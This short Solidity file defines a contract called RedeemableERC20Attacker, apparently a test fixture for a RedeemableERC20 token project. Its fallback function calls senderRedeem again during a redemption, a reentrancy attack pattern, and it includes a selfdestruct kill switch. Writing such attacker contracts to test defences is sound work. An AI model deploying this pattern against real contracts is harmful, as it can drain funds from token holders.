// SPDX-License-Identifier: MIT

pragma solidity ^0.6.12;

import {RedeemableERC20} from "../RedeemableERC20.sol";


contract RedeemableERC20Attacker {
    uint private constant BONE = 10**18;
    RedeemableERC20 public token;

    constructor(address victim_) public {
        token = RedeemableERC20(victim_);
    }

    function kill() external {
        selfdestruct(msg.sender);
    }

    function attack() external payable {
        token.senderRedeem(BONE);
    }

    fallback() external payable {
        token.senderRedeem(BONE);
    }
}
